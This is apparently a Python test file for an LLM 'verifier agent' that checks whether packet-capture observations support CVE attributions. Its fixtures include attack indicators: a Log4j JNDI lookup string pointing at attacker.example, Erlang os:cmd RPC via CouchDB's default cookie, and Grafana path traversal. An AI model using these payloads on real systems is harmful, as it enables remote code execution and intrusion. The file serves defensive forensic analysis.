"""Offline contract tests: CVE verification works with no MCP search result.

These tests mock the LLM. They verify instructions, handoff, output handling,
and negative-case safeguards, not live model accuracy.
"""
import unittest
from unittest.mock import MagicMock, patch
import sys
import types

sys.modules.setdefault('llm_client', types.SimpleNamespace(get_llm=MagicMock()))
from agents.verifier_agent import VerifierAgent
from contracts import AnalystOutput, AttackFinding, CVEProposal, ServiceFinding, VerifierOutput


class VerifierPCAPOnlyCVETests(unittest.TestCase):
    OBS = 'E-S0001-F000029-009'
    REPLY = 'E-S0001-F000031-010'

    def agent(self):
        obj = VerifierAgent.__new__(VerifierAgent)
        obj.llm = MagicMock()
        return obj

    def analyst(self, service, cve, success='Success', technique='RCE'):
        return AnalystOutput(
            service=ServiceFinding(primary=service),
            attack=AttackFinding(type='Attack', technique=technique,
                                 success=success, evidence=[self.OBS]),
            cve=CVEProposal(candidate=cve, confidence='Medium',
                            reason='Distinctive packet observation'),
        )

    def verifier_output(self, cve_support, outcome='Yes', verification='Supported'):
        return VerifierOutput(
            verification_result=verification,
            service_supported='Yes', attack_supported='Yes',
            success_supported=outcome, cve_supported=cve_support,
            evidence_check=[self.OBS], confidence='Medium',
        )

    def test_couchdb_without_mcp_can_accept_packet_based_cve(self):
        flow=(f'[{self.OBS}] Erlang RPC os:cmd(id) authenticated by CouchDB default cookie.\n'
              f'[{self.REPLY}] Server response contains command output uid=0(root).')
        candidate=self.analyst('CouchDB Erlang distribution','CVE-2022-24706')
        with patch('agents.verifier_agent.invoke_validated',
                   return_value=self.verifier_output('Yes')) as called:
            decision=self.agent().verify(flow,candidate,mcp_evidence_context='',cve_mechanism_hints='')
        assert called.call_count == 1
        prompt=called.call_args.kwargs['prompt']
        self.assertIn('CVE-2022-24706',prompt)
        self.assertIn('default cookie',prompt)
        self.assertIn('MCP are OPTIONAL',prompt)
        self.assertIn('DO NOT reject the CVE for that reason alone',prompt)
        self.assertIn('existing cybersecurity knowledge',prompt)
        self.assertIn('do NOT reliably know',prompt)
        self.assertEqual(decision.cve_supported,'Yes')

    def test_five_attack_types_get_same_rule_without_mcp(self):
        cases=[
            ('Next.js','CVE-2025-29927','X-Middleware-Subrequest'),
            ('CouchDB Erlang distribution','CVE-2022-24706','Erlang default cookie'),
            ('phpMyAdmin','CVE-2016-5734','preg_replace payload'),
            ('Grafana','CVE-2021-43798','/public/plugins/../ path traversal'),
            ('Log4j','CVE-2021-44228','${jndi:ldap://attacker.example/a}'),
        ]
        for service,cve,clue in cases:
            with self.subTest(service=service):
                with patch('agents.verifier_agent.invoke_validated',return_value=self.verifier_output('Yes')) as model:
                    out=self.agent().verify(f'[{self.OBS}] {clue}',self.analyst(service,cve))
                prompt=model.call_args.kwargs['prompt']
                self.assertIn(clue,prompt)
                self.assertIn('Online CVE research and MCP are OPTIONAL',prompt)
                self.assertIn('NOT require proof of the affected VERSION',prompt)
                self.assertEqual(out.cve_supported,'Yes')

    def test_generic_packet_clue_can_be_rejected_without_mcp(self):
        with patch('agents.verifier_agent.invoke_validated',return_value=self.verifier_output('No')) as model:
            out=self.agent().verify(f'[{self.OBS}] HTTP 200 OK',self.analyst('Apache CouchDB','CVE-2022-24706'))
        self.assertIn('generic',model.call_args.kwargs['prompt'])
        self.assertEqual(out.cve_supported,'No')
        self.assertEqual(out.verification_result,'Partially Supported')

    def test_unknown_is_not_converted_to_yes_merely_because_analyst_has_cve(self):
        with patch('agents.verifier_agent.invoke_validated',return_value=self.verifier_output('Unknown')):
            out=self.agent().verify(f'[{self.OBS}] inconclusive',self.analyst('CouchDB','CVE-2022-24706'))
        self.assertEqual(out.cve_supported,'No')

    def test_wrong_proposed_cve_can_be_rejected(self):
        with patch('agents.verifier_agent.invoke_validated',return_value=self.verifier_output('No')) as model:
            out=self.agent().verify(f'[{self.OBS}] Erlang cookie os:cmd',self.analyst('CouchDB','CVE-2025-29927'))
        self.assertIn('CVE-2025-29927',model.call_args.kwargs['prompt'])
        self.assertIn('NOT an answer key',model.call_args.kwargs['prompt'])
        self.assertEqual(out.cve_supported,'No')

    def test_failed_attack_can_keep_supported_cve(self):
        a=self.analyst('Next.js','CVE-2025-29927',success='Fail',technique='Authentication bypass')
        with patch('agents.verifier_agent.invoke_validated',return_value=self.verifier_output('Yes')):
            out=self.agent().verify(f'[{self.OBS}] X-Middleware-Subrequest blocked by login redirect',a)
        self.assertEqual(out.cve_supported,'Yes')
        self.assertEqual(out.success_supported,'Yes')

    def test_missing_candidate_not_applicable(self):
        with patch('agents.verifier_agent.invoke_validated',return_value=self.verifier_output('Yes')):
            out=self.agent().verify(f'[{self.OBS}] HTTP 200',self.analyst('Next.js','Not Found'))
        self.assertEqual(out.cve_supported,'Not Applicable')

    def test_mcp_text_is_never_mandatory(self):
        a=self.analyst('CouchDB','CVE-2022-24706')
        with patch('agents.verifier_agent.invoke_validated',return_value=self.verifier_output('Yes')) as model:
            out=self.agent().verify(f'[{self.OBS}] CouchDB Erlang RPC with default cookie',a,
                                    mcp_evidence_context='{"candidate_cves":[],"sources":[]}')
        self.assertIn('MCP are OPTIONAL',model.call_args.kwargs['prompt'])
        self.assertEqual(out.cve_supported,'Yes')

if __name__=='__main__':
    unittest.main()
